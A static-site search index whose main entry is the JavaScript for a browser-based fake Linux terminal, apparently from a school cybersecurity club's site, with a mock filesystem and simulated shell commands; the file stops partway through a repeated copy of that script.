{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"","title":"Home"},{"location":"about/","text":"","title":"About"},{"location":"test/","text":"Terminal Here's an interactive terminal with full Linux commands: (function() { setTimeout(function() { const container = document.querySelector('.terminal-content'); if (!container || typeof Terminal === 'undefined') { console.error('Terminal setup failed'); return; } const term = new Terminal({ cursorBlink: true, fontSize: 15, fontFamily: '\"Fira Code\", \"Cascadia Code\", \"JetBrains Mono\", Consolas, Monaco, monospace', fontWeight: 400, fontWeightBold: 700, lineHeight: 1.2, letterSpacing: 0, theme: { background: '#1e1e1e', foreground: '#cccccc', cursor: '#00ff00', cursorAccent: '#1e1e1e', selection: '#264f78', black: '#000000', red: '#cd3131', green: '#0dbc79', yellow: '#e5e510', blue: '#2472c8', magenta: '#bc3fbc', cyan: '#11a8cd', white: '#e5e5e5', brightBlack: '#666666', brightRed: '#f14c4c', brightGreen: '#23d18b', brightYellow: '#f5f543', brightBlue: '#3b8eea', brightMagenta: '#d670d6', brightCyan: '#29b8db', brightWhite: '#ffffff' }, allowTransparency: true }); term.open(container); // Enhanced file system let fileSystem = { '/': { 'home': { 'user': { 'documents': { 'notes.txt': 'These are my personal notes.\\nRemember to study for the exam!', 'todo.txt': '1. Finish homework\\n2. Practice CTF\\n3. Read security blog' }, 'projects': { 'cybersec': { 'README.md': '# CyberSec Project\\n\\nThis is a cybersecurity learning project.', 'exploit.py': '#!/usr/bin/env python3\\nprint(\"Hello, hacker!\")' }, 'web': { 'index.html': '<html><body>Hello World</body></html>' } }, 'scripts': { 'hello.sh': '#!/bin/bash\\necho \"Hello, World!\"' } } }, 'etc': { 'hosts': '127.0.0.1 localhost\\n::1 localhost', 'passwd': 'root:x:0:0:root:/root:/bin/bash\\nuser:x:1000:1000::/home/user:/bin/bash' }, 'var': { 'log': { 'syslog': 'System log entries...' } }, 'tmp': {} } }; let currentPath = '/home/user'; let currentLine = ''; let commandHistory = []; let historyIndex = -1; let vimMode = false; let vimBuffer = []; let vimCurrentLine = 0; let vimFilename = ''; let vimInsertMode = false; let vimCommandMode = false; let vimCommandLine = ''; term.writeln('\\x1b[1;32m\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\\x1b[0m'); term.writeln('\\x1b[1;32m\u2551 Welcome to Interactive Terminal Demo \u2551\\x1b[0m'); term.writeln('\\x1b[1;32m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\x1b[0m'); term.writeln(''); term.writeln('Type \\x1b[1;36mhelp\\x1b[0m for available commands.'); term.writeln(''); writePrompt(); function writePrompt() { term.write(`\\x1b[1;32muser@nchscyber\\x1b[0m:\\x1b[1;34m${currentPath}\\x1b[0m$ `); } function getObjectAtPath(path) { if (path === '/') return fileSystem['/']; const parts = path.split('/').filter(p => p); let current = fileSystem['/']; for (const part of parts) { if (!current || current[part] === undefined) { return null; } current = current[part]; } return current; } function resolvePath(path) { if (path.startsWith('/')) { return path; } if (path === '~') { return '/home/user'; } if (path.startsWith('~/')) { return '/home/user/' + path.substring(2); } let result = currentPath; const parts = path.split('/'); for (const part of parts) { if (part === '..') { const segments = result.split('/').filter(p => p); segments.pop(); result = '/' + segments.join('/'); if (result === '/') result = '/'; } else if (part === '.' || part === '') { continue; } else { result = result + (result.endsWith('/') ? '' : '/') + part; } } return result; } function isDirectory(obj) { return obj !== null && typeof obj === 'object' && !Array.isArray(obj); } function processCommand(cmd) { // Handle pipes if (cmd.includes('|')) { const parts = cmd.split('|').map(p => p.trim()); let output = null; for (let i = 0; i < parts.length; i++) { if (i === 0) { output = executeCommand(parts[i]); } else { output = executeCommand(parts[i], output); } } return; } // Handle output redirection if (cmd.includes('>')) { const parts = cmd.split('>').map(p => p.trim()); const output = executeCommand(parts[0]); if (output && parts[1]) { const filepath = resolvePath(parts[1]); const pathParts = filepath.split('/').filter(p => p); const filename = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || '/'); if (dir && isDirectory(dir)) { dir[filename] = output.join('\\n'); term.writeln(`\\x1b[32mOutput written to ${parts[1]}\\x1b[0m`); } else { term.writeln(`\\x1b[31mError: Directory not found\\x1b[0m`); } } return; } executeCommand(cmd); } function executeCommand(cmd, pipeInput = null) { const parts = cmd.split(' ').filter(p => p); const command = parts[0]; const args = parts.slice(1); const commands = { 'help': () => { const output = [ '\\x1b[1;33mAvailable Commands:\\x1b[0m', ' \\x1b[36mhelp\\x1b[0m - Show this help message', ' \\x1b[36mclear\\x1b[0m - Clear the terminal screen', ' \\x1b[36mecho\\x1b[0m - Print text to terminal', ' \\x1b[36mdate\\x1b[0m - Show current date and time', ' \\x1b[36mpwd\\x1b[0m - Print working directory', ' \\x1b[36mls\\x1b[0m - List directory contents', ' \\x1b[36mcd\\x1b[0m - Change directory', ' \\x1b[36mmkdir\\x1b[0m - Create a new directory', ' \\x1b[36mrmdir\\x1b[0m - Remove empty directory', ' \\x1b[36mtouch\\x1b[0m - Create a new file', ' \\x1b[36mcat\\x1b[0m - Display file contents', ' \\x1b[36mrm\\x1b[0m - Remove file or directory', ' \\x1b[36mmv\\x1b[0m - Move/rename files', ' \\x1b[36mcp\\x1b[0m - Copy files', ' \\x1b[36mgrep\\x1b[0m - Search for patterns', ' \\x1b[36mfind\\x1b[0m - Find files', ' \\x1b[36mwhoami\\x1b[0m - Display current user', ' \\x1b[36muname\\x1b[0m - Display system information', ' \\x1b[36mvim\\x1b[0m - Text editor', '', '\\x1b[1;33mAdvanced:\\x1b[0m', ' Use \\x1b[36m|\\x1b[0m for pipes: ls | grep test', ' Use \\x1b[36m>\\x1b[0m for output: echo hello > file.txt' ]; output.forEach(line => term.writeln(line)); return output; }, 'clear': () => { term.clear(); return []; }, 'date': () => { const output = [new Date().toString()]; term.writeln(output[0]); return output; }, 'pwd': () => { const output = [currentPath]; term.writeln(output[0]); return output; }, 'whoami': () => { const output = ['user']; term.writeln(output[0]); return output; }, 'uname': () => { const output = args[0] === '-a' ? ['Linux nchscyber 5.15.0 #1 SMP x86_64 GNU/Linux'] : ['Linux']; term.writeln(output[0]); return output; }, 'ls': () => { const path = args[0] ? resolvePath(args[0]) : currentPath; const obj = getObjectAtPath(path); const output = []; if (!obj) { term.writeln(`\\x1b[31mls: ${args[0]}: No such file or directory\\x1b[0m`); return []; } if (!isDirectory(obj)) { term.writeln(`\\x1b[31mls: ${args[0]}: Not a directory\\x1b[0m`); return []; } const entries = Object.keys(obj); if (entries.length === 0) { return []; } entries.forEach(entry => { if (isDirectory(obj[entry])) { term.writeln(`\\x1b[1;34m${entry}/\\x1b[0m`); output.push(entry + '/'); } else { term.writeln(`\\x1b[37m${entry}\\x1b[0m`); output.push(entry); } }); return output; }, 'cd': () => { if (args.length === 0 || args[0] === '~') { currentPath = '/home/user'; return []; } const newPath = resolvePath(args[0]); const obj = getObjectAtPath(newPath); if (obj && isDirectory(obj)) { currentPath = newPath; } else { term.writeln(`\\x1b[31mcd: ${args[0]}: No such directory\\x1b[0m`); } return []; }, 'mkdir': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: mkdir <directory_name>\\x1b[0m'); return []; } const path = resolvePath(args[0]); const pathParts = path.split('/').filter(p => p); const dirName = pathParts.pop(); const parentPath = '/' + pathParts.join('/'); const parent = getObjectAtPath(parentPath || '/'); if (parent && isDirectory(parent)) { if (parent[dirName]) { term.writeln(`\\x1b[31mmkdir: ${args[0]}: File exists\\x1b[0m`); } else { parent[dirName] = {}; term.writeln(`\\x1b[32mDirectory '${args[0]}' created\\x1b[0m`); } } else { term.writeln(`\\x1b[31mmkdir: cannot create directory '${args[0]}': No such file or directory\\x1b[0m`); } return []; }, 'rmdir': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: rmdir <directory_name>\\x1b[0m'); return []; } const path = resolvePath(args[0]); const pathParts = path.split('/').filter(p => p); const dirName = pathParts.pop(); const parentPath = '/' + pathParts.join('/'); const parent = getObjectAtPath(parentPath || '/'); if (parent && parent[dirName]) { if (isDirectory(parent[dirName])) { if (Object.keys(parent[dirName]).length === 0) { delete parent[dirName]; term.writeln(`\\x1b[32mDirectory '${args[0]}' removed\\x1b[0m`); } else { term.writeln(`\\x1b[31mrmdir: ${args[0]}: Directory not empty\\x1b[0m`); } } else { term.writeln(`\\x1b[31mrmdir: ${args[0]}: Not a directory\\x1b[0m`); } } else { term.writeln(`\\x1b[31mrmdir: ${args[0]}: No such directory\\x1b[0m`); } return []; }, 'touch': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: touch <filename>\\x1b[0m'); return []; } const path = resolvePath(args[0]); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || currentPath); if (dir && isDirectory(dir)) { dir[fileName] = dir[fileName] || ''; term.writeln(`\\x1b[32mFile '${args[0]}' created\\x1b[0m`); } else { term.writeln(`\\x1b[31mtouch: cannot touch '${args[0]}': No such file or directory\\x1b[0m`); } return []; }, 'cat': () => { if (pipeInput !== null) { pipeInput.forEach(line => term.writeln(line)); return pipeInput; } if (args.length === 0) { term.writeln('\\x1b[31mUsage: cat <filename>\\x1b[0m'); return []; } const path = resolvePath(args[0]); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || '/'); if (dir && dir[fileName] !== undefined) { if (typeof dir[fileName] === 'string') { const output = dir[fileName].split('\\n'); output.forEach(line => term.writeln(line)); return output; } else { term.writeln(`\\x1b[31mcat: ${args[0]}: Is a directory\\x1b[0m`); } } else { term.writeln(`\\x1b[31mcat: ${args[0]}: No such file or directory\\x1b[0m`); } return []; }, 'rm': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: rm [-r] <file_or_directory>\\x1b[0m'); return []; } const recursive = args[0] === '-r' || args[0] === '-rf'; const target = recursive ? args[1] : args[0]; if (!target) { term.writeln('\\x1b[31mUsage: rm [-r] <file_or_directory>\\x1b[0m'); return []; } const path = resolvePath(target); const pathParts = path.split('/').filter(p => p); const name = pathParts.pop(); const parentPath = '/' + pathParts.join('/'); const parent = getObjectAtPath(parentPath || '/'); if (parent && parent[name] !== undefined) { if (isDirectory(parent[name]) && !recursive) { term.writeln(`\\x1b[31mrm: ${target}: is a directory (use -r to remove)\\x1b[0m`); } else { delete parent[name]; term.writeln(`\\x1b[32m'${target}' removed\\x1b[0m`); } } else { term.writeln(`\\x1b[31mrm: ${target}: No such file or directory\\x1b[0m`); } return []; }, 'mv': () => { if (args.length < 2) { term.writeln('\\x1b[31mUsage: mv <source> <destination>\\x1b[0m'); return []; } const srcPath = resolvePath(args[0]); const dstPath = resolvePath(args[1]); const srcParts = srcPath.split('/').filter(p => p); const srcName = srcParts.pop(); const srcParentPath = '/' + srcParts.join('/'); const dstParts = dstPath.split('/').filter(p => p); const dstName = dstParts.pop(); const dstParentPath = '/' + dstParts.join('/'); const srcParent = getObjectAtPath(srcParentPath || '/'); const dstParent = getObjectAtPath(dstParentPath || '/'); if (srcParent && srcParent[srcName] !== undefined && dstParent && isDirectory(dstParent)) { dstParent[dstName] = srcParent[srcName]; delete srcParent[srcName]; term.writeln(`\\x1b[32m'${args[0]}' moved to '${args[1]}'\\x1b[0m`); } else { term.writeln(`\\x1b[31mmv: cannot move '${args[0]}' to '${args[1]}'\\x1b[0m`); } return []; }, 'cp': () => { if (args.length < 2) { term.writeln('\\x1b[31mUsage: cp <source> <destination>\\x1b[0m'); return []; } const srcPath = resolvePath(args[0]); const dstPath = resolvePath(args[1]); const srcParts = srcPath.split('/').filter(p => p); const srcName = srcParts.pop(); const srcParentPath = '/' + srcParts.join('/'); const dstParts = dstPath.split('/').filter(p => p); const dstName = dstParts.pop(); const dstParentPath = '/' + dstParts.join('/'); const srcParent = getObjectAtPath(srcParentPath || '/'); const dstParent = getObjectAtPath(dstParentPath || '/'); if (srcParent && srcParent[srcName] !== undefined && dstParent && isDirectory(dstParent)) { if (typeof srcParent[srcName] === 'string') { dstParent[dstName] = srcParent[srcName]; term.writeln(`\\x1b[32m'${args[0]}' copied to '${args[1]}'\\x1b[0m`); } else { term.writeln(`\\x1b[31mcp: ${args[0]}: Is a directory (directory copy not implemented)\\x1b[0m`); } } else { term.writeln(`\\x1b[31mcp: cannot copy '${args[0]}' to '${args[1]}'\\x1b[0m`); } return []; }, 'grep': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: grep <pattern> [file] or <command> | grep <pattern>\\x1b[0m'); return []; } const pattern = args[0]; let searchLines = []; if (pipeInput !== null) { searchLines = pipeInput; } else if (args[1]) { const path = resolvePath(args[1]); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || '/'); if (dir && typeof dir[fileName] === 'string') { searchLines = dir[fileName].split('\\n'); } } const output = searchLines.filter(line => line.toLowerCase().includes(pattern.toLowerCase()) ); output.forEach(line => term.writeln(line)); return output; }, 'find': () => { const searchName = args[0] || ''; const output = []; function searchDir(path, obj) { if (!isDirectory(obj)) return; for (const [name, value] of Object.entries(obj)) { const fullPath = path + (path === '/' ? '' : '/') + name; if (name.includes(searchName)) { output.push(fullPath); term.writeln(fullPath); } if (isDirectory(value)) { searchDir(fullPath, value); } } } searchDir('/', fileSystem['/']); return output; }, 'echo': () => { const output = [args.join(' ')]; term.writeln(output[0]); return output; }, 'vim': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: vim <filename>\\x1b[0m'); return []; } vimFilename = args[0]; const path = resolvePath(vimFilename); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || currentPath); if (dir && dir[fileName] !== undefined) { if (typeof dir[fileName] === 'string') { vimBuffer = dir[fileName].split('\\n'); } else { term.writeln(`\\x1b[31mvim: ${vimFilename}: Is a directory\\x1b[0m`); return []; } } else { vimBuffer = ['']; } vimMode = true; vimInsertMode = false; vimCommandMode = false; vimCommandLine = ''; vimCurrentLine = 0; displayVim(); return []; } }; if (commands[command]) { return commands[command](); } else { term.writeln(`\\x1b[31m${command}: command not found\\x1b[0m`); return []; } } function displayVim() { term.clear(); vimBuffer.forEach((line, i) => { if (i === vimCurrentLine && !vimCommandMode) { term.writeln(`\\x1b[7m${line || ' '}\\x1b[0m`); } else { term.writeln(line); } }); term.write('\\r\\n'); const mode = vimInsertMode ? '-- INSERT --' : (vimCommandMode ? '' : '-- NORMAL --'); const status = `\\x1b[7m ${vimFilename} [${vimBuffer.length} lines] ${mode} \\x1b[0m`; term.writeln(status); if (!vimInsertMode && !vimCommandMode) { term.writeln('\\x1b[33m[i=insert, j/k=move, :w=save, :q=quit, :wq=save&quit]\\x1b[0m'); } if (vimCommandMode) { term.write(':' + vimCommandLine); } } function handleVimInput(key, domEvent) { if (vimCommandMode) { if (domEvent.key === 'Enter') { term.write('\\r\\n'); if (vimCommandLine === 'w' || vimCommandLine === 'wq') { const path = resolvePath(vimFilename); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || currentPath); if (dir) { dir[fileName] = vimBuffer.join('\\n'); term.writeln(`\\x1b[32m\"${vimFilename}\" ${vimBuffer.length} lines written\\x1b[0m`); } } if (vimCommandLine === 'q' || vimCommandLine === 'wq' || vimCommandLine === 'q!') { vimMode = false; setTimeout(() => { term.clear(); writePrompt(); }, vimCommandLine === 'wq' ? 800 : 0); } else { setTimeout(() => displayVim(), 1000); } vimCommandMode = false; vimCommandLine = ''; } else if (domEvent.key === 'Escape') { vimCommandMode = false; vimCommandLine = ''; displayVim(); } else if (domEvent.key === 'Backspace') { if (vimCommandLine.length > 0) { vimCommandLine = vimCommandLine.slice(0, -1); displayVim(); } } else if (key.length === 1) { vimCommandLine += key; displayVim(); } } else if (!vimInsertMode) { if (key === 'i') { vimInsertMode = true; displayVim(); } else if (key === 'j' && vimCurrentLine < vimBuffer.length - 1) { vimCurrentLine++; displayVim(); } else if (key === 'k' && vimCurrentLine > 0) { vimCurrentLine--; displayVim(); } else if (key === ':') { vimCommandMode = true; displayVim(); } } else { if (domEvent.key === 'Escape') { vimInsertMode = false; displayVim(); } else if (domEvent.key === 'Enter') { vimBuffer.splice(vimCurrentLine + 1, 0, ''); vimCurrentLine++; displayVim(); } else if (domEvent.key === 'Backspace') { if (vimBuffer[vimCurrentLine].length > 0) { vimBuffer[vimCurrentLine] = vimBuffer[vimCurrentLine].slice(0, -1); } else if (vimCurrentLine > 0) { vimBuffer.splice(vimCurrentLine, 1); vimCurrentLine--; } displayVim(); } else if (key.length === 1) { vimBuffer[vimCurrentLine] = (vimBuffer[vimCurrentLine] || '') + key; displayVim(); } } } term.onKey(function(e) { if (vimMode) { handleVimInput(e.key, e.domEvent); return; } const ev = e.domEvent; const printable = !ev.altKey && !ev.ctrlKey && !ev.metaKey; if (ev.key === 'Enter') { term.write('\\r\\n'); if (currentLine.trim()) { commandHistory.push(currentLine.trim()); historyIndex = commandHistory.length; processCommand(currentLine.trim()); } currentLine = ''; if (!vimMode) { writePrompt(); } } else if (ev.key === 'Backspace') { if (currentLine.length > 0) { currentLine = currentLine.slice(0, -1); term.write('\\b \\b'); } } else if (ev.key === 'ArrowUp') { if (historyIndex > 0) { historyIndex--; replaceCurrentLine(commandHistory[historyIndex]); } } else if (ev.key === 'ArrowDown') { if (historyIndex < commandHistory.length - 1) { historyIndex++; replaceCurrentLine(commandHistory[historyIndex]); } else { historyIndex = commandHistory.length; replaceCurrentLine(''); } } else if (ev.key === 'Tab') { ev.preventDefault(); } else if (printable) { currentLine += e.key; term.write(e.key); } }); function replaceCurrentLine(newLine) { term.write('\\r'); writePrompt(); term.write(' '.repeat(currentLine.length)); term.write('\\r'); writePrompt(); currentLine = newLine; term.write(currentLine); } }, 100); })();","title":"Terminal"},{"location":"test/#terminal","text":"Here's an interactive terminal with full Linux commands: (function() { setTimeout(function() { const container = document.querySelector('.terminal-content'); if (!container || typeof Terminal === 'undefined') { console.error('Terminal setup failed'); return; } const term = new Terminal({ cursorBlink: true, fontSize: 15, fontFamily: '\"Fira Code\", \"Cascadia Code\", \"JetBrains Mono\", Consolas, Monaco, monospace', fontWeight: 400, fontWeightBold: 700, lineHeight: 1.2, letterSpacing: 0, theme: { background: '#1e1e1e', foreground: '#cccccc', cursor: '#00ff00', cursorAccent: '#1e1e1e', selection: '#264f78', black: '#000000', red: '#cd3131', green: '#0dbc79', yellow: '#e5e510', blue: '#2472c8', magenta: '#bc3fbc', cyan: '#11a8cd', white: '#e5e5e5', brightBlack: '#666666', brightRed: '#f14c4c', brightGreen: '#23d18b', brightYellow: '#f5f543', brightBlue: '#3b8eea', brightMagenta: '#d670d6', brightCyan: '#29b8db', brightWhite: '#ffffff' }, allowTransparency: true }); term.open(container); // Enhanced file system let fileSystem = { '/': { 'home': { 'user': { 'documents': { 'notes.txt': 'These are my personal notes.\\nRemember to study for the exam!', 'todo.txt': '1. Finish homework\\n2. Practice CTF\\n3. Read security blog' }, 'projects': { 'cybersec': { 'README.md': '# CyberSec Project\\n\\nThis is a cybersecurity learning project.', 'exploit.py': '#!/usr/bin/env python3\\nprint(\"Hello, hacker!\")' }, 'web': { 'index.html': '<html><body>Hello World</body></html>' } }, 'scripts': { 'hello.sh': '#!/bin/bash\\necho \"Hello, World!\"' } } }, 'etc': { 'hosts': '127.0.0.1 localhost\\n::1 localhost', 'passwd': 'root:x:0:0:root:/root:/bin/bash\\nuser:x:1000:1000::/home/user:/bin/bash' }, 'var': { 'log': { 'syslog': 'System log entries...' } }, 'tmp': {} } }; let currentPath = '/home/user'; let currentLine = ''; let commandHistory = []; let historyIndex = -1; let vimMode = false; let vimBuffer = []; let vimCurrentLine = 0; let vimFilename = ''; let vimInsertMode = false; let vimCommandMode = false; let vimCommandLine = ''; term.writeln('\\x1b[1;32m\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\\x1b[0m'); term.writeln('\\x1b[1;32m\u2551 Welcome to Interactive Terminal Demo \u2551\\x1b[0m'); term.writeln('\\x1b[1;32m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\x1b[0m'); term.writeln(''); term.writeln('Type \\x1b[1;36mhelp\\x1b[0m for available commands.'); term.writeln(''); writePrompt(); function writePrompt() { term.write(`\\x1b[1;32muser@nchscyber\\x1b[0m:\\x1b[1;34m${currentPath}\\x1b[0m$ `); } function getObjectAtPath(path) { if (path === '/') return fileSystem['/']; const parts = path.split('/').filter(p => p); let current = fileSystem['/']; for (const part of parts) { if (!current || current[part] === undefined) { return null; } current = current[part]; } return current; } function resolvePath(path) { if (path.startsWith('/')) { return path; } if (path === '~') { return '/home/user'; } if (path.startsWith('~/')) { return '/home/user/' + path.substring(2); } let result = currentPath; const parts = path.split('/'); for (const part of parts) { if (part === '..') { const segments = result.split('/').filter(p => p); segments.pop(); result = '/' + segments.join('/'); if (result === '/') result = '/'; } else if (part === '.' || part === '') { continue; } else { result = result + (result.endsWith('/') ? '' : '/') + part; } } return result; } function isDirectory(obj) { return obj !== null && typeof obj === 'object' && !Array.isArray(obj); } function processCommand(cmd) { // Handle pipes if (cmd.includes('|')) { const parts = cmd.split('|').map(p => p.trim()); let output = null; for (let i = 0; i < parts.length; i++) { if (i === 0) { output = executeCommand(parts[i]); } else { output = executeCommand(parts[i], output); } } return; } // Handle output redirection if (cmd.includes('>')) { const parts = cmd.split('>').map(p => p.trim()); const output = executeCommand(parts[0]); if (output && parts[1]) { const filepath = resolvePath(parts[1]); const pathParts = filepath.split('/').filter(p => p); const filename = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || '/'); if (dir && isDirectory(dir)) { dir[filename] = output.join('\\n'); term.writeln(`\\x1b[32mOutput written to ${parts[1]}\\x1b[0m`); } else { term.writeln(`\\x1b[31mError: Directory not found\\x1b[0m`); } } return; } executeCommand(cmd); } function executeCommand(cmd, pipeInput = null) { const parts = cmd.split(' ').filter(p => p); const command = parts[0]; const args = parts.slice(1); const commands = { 'help': () => { const output = [ '\\x1b[1;33mAvailable Commands:\\x1b[0m', ' \\x1b[36mhelp\\x1b[0m - Show this help message', ' \\x1b[36mclear\\x1b[0m - Clear the terminal screen', ' \\x1b[36mecho\\x1b[0m - Print text to terminal', ' \\x1b[36mdate\\x1b[0m - Show current date and time', ' \\x1b[36mpwd\\x1b[0m - Print working directory', ' \\x1b[36mls\\x1b[0m - List directory contents', ' \\x1b[36mcd\\x1b[0m - Change directory', ' \\x1b[36mmkdir\\x1b[0m - Create a new directory', ' \\x1b[36mrmdir\\x1b[0m - Remove empty directory', ' \\x1b[36mtouch\\x1b[0m - Create a new file', ' \\x1b[36mcat\\x1b[0m - Display file contents', ' \\x1b[36mrm\\x1b[0m - Remove file or directory', ' \\x1b[36mmv\\x1b[0m - Move/rename files', ' \\x1b[36mcp\\x1b[0m - Copy files', ' \\x1b[36mgrep\\x1b[0m - Search for patterns', ' \\x1b[36mfind\\x1b[0m - Find files', ' \\x1b[36mwhoami\\x1b[0m - Display current user', ' \\x1b[36muname\\x1b[0m - Display system information', ' \\x1b[36mvim\\x1b[0m - Text editor', '', '\\x1b[1;33mAdvanced:\\x1b[0m', ' Use \\x1b[36m|\\x1b[0m for pipes: ls | grep test', ' Use \\x1b[36m>\\x1b[0m for output: echo hello > file.txt' ]; output.forEach(line => term.writeln(line)); return output; }, 'clear': () => { term.clear(); return []; }, 'date': () => { const output = [new Date().toString()]; term.writeln(output[0]); return output; }, 'pwd': () => { const output = [currentPath]; term.writeln(output[0]); return output; }, 'whoami': () => { const output = ['user']; term.writeln(output[0]); return output; }, 'uname': () => { const output = args[0] === '-a' ? ['Linux nchscyber 5.15.0 #1 SMP x86_64 GNU/Linux'] : ['Linux']; term.writeln(output[0]); return output; }, 'ls': () => { const path = args[0] ? resolvePath(args[0]) : currentPath; const obj = getObjectAtPath(path); const output = []; if (!obj) { term.writeln(`\\x1b[31mls: ${args[0]}: No such file or directory\\x1b[0m`); return []; } if (!isDirectory(obj)) { term.writeln(`\\x1b[31mls: ${args[0]}: Not a directory\\x1b[0m`); return []; } const entries = Object.keys(obj); if (entries.length === 0) { return []; } entries.forEach(entry => { if (isDirectory(obj[entry])) { term.writeln(`\\x1b[1;34m${entry}/\\x1b[0m`); output.push(entry + '/'); } else { term.writeln(`\\x1b[37m${entry}\\x1b[0m`); output.push(entry); } }); return output; }, 'cd': () => { if (args.length === 0 || args[0] === '~') { currentPath = '/home/user'; return []; } const newPath = resolvePath(args[0]); const obj = getObjectAtPath(newPath); if (obj && isDirectory(obj)) { currentPath = newPath; } else { term.writeln(`\\x1b[31mcd: ${args[0]}: No such directory\\x1b[0m`); } return []; }, 'mkdir': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: mkdir <directory_name>\\x1b[0m'); return []; } const path = resolvePath(args[0]); const pathParts = path.split('/').filter(p => p); const dirName = pathParts.pop(); const parentPath = '/' + pathParts.join('/'); const parent = getObjectAtPath(parentPath || '/'); if (parent && isDirectory(parent)) { if (parent[dirName]) { term.writeln(`\\x1b[31mmkdir: ${args[0]}: File exists\\x1b[0m`); } else { parent[dirName] = {}; term.writeln(`\\x1b[32mDirectory '${args[0]}' created\\x1b[0m`); } } else { term.writeln(`\\x1b[31mmkdir: cannot create directory '${args[0]}': No such file or directory\\x1b[0m`); } return []; }, 'rmdir': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: rmdir <directory_name>\\x1b[0m'); return []; } const path = resolvePath(args[0]); const pathParts = path.split('/').filter(p => p); const dirName = pathParts.pop(); const parentPath = '/' + pathParts.join('/'); const parent = getObjectAtPath(parentPath || '/'); if (parent && parent[dirName]) { if (isDirectory(parent[dirName])) { if (Object.keys(parent[dirName]).length === 0) { delete parent[dirName]; term.writeln(`\\x1b[32mDirectory '${args[0]}' removed\\x1b[0m`); } else { term.writeln(`\\x1b[31mrmdir: ${args[0]}: Directory not empty\\x1b[0m`); } } else { term.writeln(`\\x1b[31mrmdir: ${args[0]}: Not a directory\\x1b[0m`); } } else { term.writeln(`\\x1b[31mrmdir: ${args[0]}: No such directory\\x1b[0m`); } return []; }, 'touch': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: touch <filename>\\x1b[0m'); return []; } const path = resolvePath(args[0]); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || currentPath); if (dir && isDirectory(dir)) { dir[fileName] = dir[fileName] || ''; term.writeln(`\\x1b[32mFile '${args[0]}' created\\x1b[0m`); } else { term.writeln(`\\x1b[31mtouch: cannot touch '${args[0]}': No such file or directory\\x1b[0m`); } return []; }, 'cat': () => { if (pipeInput !== null) { pipeInput.forEach(line => term.writeln(line)); return pipeInput; } if (args.length === 0) { term.writeln('\\x1b[31mUsage: cat <filename>\\x1b[0m'); return []; } const path = resolvePath(args[0]); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || '/'); if (dir && dir[fileName] !== undefined) { if (typeof dir[fileName] === 'string') { const output = dir[fileName].split('\\n'); output.forEach(line => term.writeln(line)); return output; } else { term.writeln(`\\x1b[31mcat: ${args[0]}: Is a directory\\x1b[0m`); } } else { term.writeln(`\\x1b[31mcat: ${args[0]}: No such file or directory\\x1b[0m`); } return []; }, 'rm': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: rm [-r] <file_or_directory>\\x1b[0m'); return []; } const recursive = args[0] === '-r' || args[0] === '-rf'; const target = recursive ? args[1] : args[0]; if (!target) { term.writeln('\\x1b[31mUsage: rm [-r] <file_or_directory>\\x1b[0m'); return []; } const path = resolvePath(target); const pathParts = path.split('/').filter(p => p); const name = pathParts.pop(); const parentPath = '/' + pathParts.join('/'); const parent = getObjectAtPath(parentPath || '/'); if (parent && parent[name] !== undefined) { if (isDirectory(parent[name]) && !recursive) { term.writeln(`\\x1b[31mrm: ${target}: is a directory (use -r to remove)\\x1b[0m`); } else { delete parent[name]; term.writeln(`\\x1b[32m'${target}' removed\\x1b[0m`); } } else { term.writeln(`\\x1b[31mrm: ${target}: No such file or directory\\x1b[0m`); } 